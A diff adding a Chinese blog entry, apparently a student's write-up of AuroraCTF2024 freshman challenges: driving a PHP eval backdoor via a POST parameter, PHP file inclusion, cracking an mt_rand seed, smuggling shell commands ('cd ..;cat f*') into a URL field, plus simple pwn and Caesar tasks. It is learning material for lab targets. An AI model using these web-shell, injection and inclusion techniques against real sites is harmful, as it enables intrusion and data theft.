@@ -49,4 +49,118 @@ $ 努力是不会背叛自己的，虽然梦想会背叛。 努力不一定能�
         <tag>网页测试</tag>
       </tags>
   </entry>
+  <entry>
+    <title>AuroraCTF2024 新生赛题目复现</title>
+    <url>/2025/05/22/2025%E5%B9%B4Aurora-%E6%96%B0%E7%94%9F%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[靶场成绩
+复现Web一剑连接 | 已完成（即自主完成）
+看学长给的web题解里面，用蚁剑相当方便，但是我没有这个工具，于是我是用burpsuite完成该题
+本题点入题目链接可以看到题目的初步要求：
+于是我就选择使用burpsuite来进行传参，首先先对题目的网址进行抓取，并将截取的request放到repeater进行修改
+![初次抓包](&#x2F;img&#x2F;Aurora2024新生赛&#x2F;图片4.png#pic_center &#x3D;70x50)
+按题目要求修改get和post同时传参,混合传参注意格式格式将GET换POST，get传参的变量放后面
+$ POST /?god1=izayoishiki 
+紧接post的格式
+$ Content-Type:application/x-www-form-urlencoded
+$ god2=cauliweak9
+注意检查post传参赋值后面有没有换行，如有换行，应删除因为换行也被考虑在赋值里面
+图片如下：得到location：
+$ Location:bAckd0o0o0or.php 
+
+
+
+
+然后我们对该地址进行访问，可以得到我们要post传参ant这一参数：
+$ eval ($_POST[&#x27;ant&#x27;]); 
+
+
+由题目我们可以知道，flag在&#x2F;tmp中，我猜测&#x2F;tmp是一个目录，我得确定里面的文件名方便我读取于是
+$ ant=print_r(scandir(‘/tmp&#x27;)); 
+也就是请求展示这一目录里的文件
+得到：
+$ eval($ POST[&#x27;ant’]);Array([0] =&gt; .[1] =&gt; ..[2] =&gt; f13g_1s h3re)
+
+
+
+
+但是这个关于flag的线索不太像文件，于是我继续读取，得到一个仍然不太像文件的数字
+结合题目意思，我感觉是一个一直嵌套下去的目录，可以直到读取文件，于是我读取再读取，直到文件出来
+$ flaggggg.txt 
+
+
+
+
+得到文件后，读取该文件内容，就能得到flag这时，我们post传参的命令也要有所变化
+$ ant=echo$ file_get contents(&#x27; &#x27;); 
+
+
+
+flag如下：
+Just Signin | 已完成（即自主完成）
+这道web的签到题上来我就只想到了伪协议，但是没有回显，卡了好久，甚至看hint还看漏点了，悲，好在还是有惊无险做出来了
+点进题目链接可以发现网页源代码已经显示，是简单的文件包含get传参
+$ &lt;?php$   highlight_file(_FILE_);$   error reporting(0);$  //flag is in flag.php$   $u = $_GET[&#x27;_err0r233.yyds&#x27;];$   include $u; $ ?&gt;  
+
+没看到有什么黑名单过滤，于是我就用常规的伪协议完成文件包含，但是没有任何回显
+看到hint里的字符串特性，才明白，字符串参数里的符号需要进行略微修改
+
+根据提示改正传参，得到返回的base64编码
+解码得到flag
+天才麻将ctfer | 已完成（即自主完成）
+点进题目链接，看到题目
+先用burpsuite对该网页进行抓取，然后在该网页html代码里发现两个重要的传参
+$ ?action=getdata
+$ /src.html 
+
+于是试试对该网页进行传参，传参getdata后得到提示，随机序列，很像伪随机数的题目
+然后进行第二个传参，然后发现该网页的php代码
+
+由其中mt_srand($seed)，可确定是一道种子伪随机数的题目
+于是我想到用php_mt_seed进行爆破，那首先的将我们得到的随机序列变成工具读取的形式，编写php脚本
+$ &lt;?phperror_reporting(0);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$string=&#x27;ZqYRt5oTIl&#x27;;$len1=6;for ( $i = 0; $i &lt; $len1; $i++ )&#123;$pos=strpos($str_long1,$string[$i]);    echo $pos.&quot; &quot;.$pos.&quot; 0 61 &quot; ;  &#125;?&gt; 
+（string后面是我们得到的随机序列，而我们要得三张手牌，大写字母加数字，总共六长度，于是len1&#x3D;6）
+我选择放到phpstudy上运行
+然后在linux虚拟机上使用php_mt_seed，将这一串数字代入
+发现了一个种子seed&#x3D;302663906将其带入网页源代码中的php代码便可得到手牌
+$ &lt;?php    highlight_file(__FILE__);    //index.php        $seed = &quot;&lt;hidden&gt;&quot;;    $maj = [&#x27;1m&#x27;, &#x27;2m&#x27;, &#x27;3m&#x27;, &#x27;4m&#x27;, &#x27;5m&#x27;, &#x27;6m&#x27;, &#x27;7m&#x27;, &#x27;8m&#x27;, &#x27;9m&#x27;, &#x27;1p&#x27;, &#x27;2p&#x27;, &#x27;3p&#x27;, &#x27;4p&#x27;, &#x27;5p&#x27;, &#x27;6p&#x27;, &#x27;7p&#x27;, &#x27;8p&#x27;, &#x27;9p&#x27;, &#x27;1s&#x27;, &#x27;2s&#x27;, &#x27;3s&#x27;, &#x27;4s&#x27;, &#x27;5s&#x27;, &#x27;6s&#x27;, &#x27;7s&#x27;, &#x27;8s&#x27;, &#x27;9s&#x27;];    #count($maj) = 27;    mt_srand(302663906);    $str=&#x27;&#x27;;    for($i=0;$i&lt;5;$i++)&#123;        $str .= $maj[mt_rand() % 27];    &#125;    $res = &#x27;&#x27;;    for($i=0;$i&lt;3;$i++)&#123;        $res .= $maj[mt_rand() % 27];    &#125;    echo $res;    if(isset($_POST[&#x27;guess&#x27;]))&#123;        if($_POST[&#x27;guess&#x27;]===$res)&#123;            $flag = file_get_contents(&#x27;/flag&#x27;);            $ret = &quot;猜对了! 给你flag: $flag&quot;;        &#125;        else&#123;            $ret = &quot;猜错了!&quot;;        &#125;    &#125;    if(isset($_GET[&#x27;action&#x27;]))&#123;        if($_GET[&#x27;action&#x27;]===&#x27;getdata&#x27;)&#123;            $ret = get_random_str($seed);        &#125;            &#125;?&gt;
+
+在mt——srand后面（）中填入得到的种子，而res正是我们的手牌，于是我在中间插入了echo$res，在phpstudy上运行得
+
+将手牌填入原网页，得flag
+天才麻将ctfer-全国大赛篇 | 已完成（即自主完成）
+这一道题和天才麻将ctfer题目的思路一样，在将随机序列化为格式的脚本中，将len的数值改为5*2&#x3D;10即可
+URL_Parser| 已复现（即看Writeup学习后完成的）
+做这道题只差临门一脚，最后的判断没有头绪，悲点开题目链接后，发现网页源代码
+根据代码，写了一道完整的url，其中3fde6bb0541387e4ebdadf7c2ff31123MD5解码后得到1q2w3e
+传参：
+$ url=getflag://Err0r233:1q2w3e@whoami 
+@后面是命令，我选择whoami来做
+这里我看出来了不能直接用‘&#x2F;’，但是运用cd命令时后面重复的是..cd;..cd，导致出错
+正确的应该是:
+$ @cd ..;cd ..;cd ..;cd ..;cat f* 
+
+完善url，随即得到flag:
+Pwnnc | 已完成（即自主完成）
+nc某个网址，我选择在linux模拟机上完成nc direct.szu.moe 10077命令，接着用ls和cat命令得到flag
+CryptoSIGIN IN!!! | 已完成（即自主完成）下载文件得到:
+$ Nheben&#123;Jrypbzr_gb_gur_Jbeyq_bs_Pelcgbtencul&#125; 
+类似flag形式的字母，但是进行了字母加密，初步分析应该是凯撒密码，所以用位移解密，得到flag：
+$ Aurora&#123;Welcome_to_the_World_of_Cryptography&#125; 
+
+
+Misc炸鱼薯条问答-五成熟 | 已完成（即自主完成）
+点进题目链接，发现问卷
+由hint可知答案格式应为正则表达式，而且有例子，更能方便做题，这六道题的答案分别为
+
+答对百分之五十即可得flag
+炸鱼薯条问答-全熟 | 已完成（即自主完成）
+在五成熟的题目答对百分之百，即可得flag
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>AuroraCTF</tag>
+      </tags>
+  </entry>
 </search>
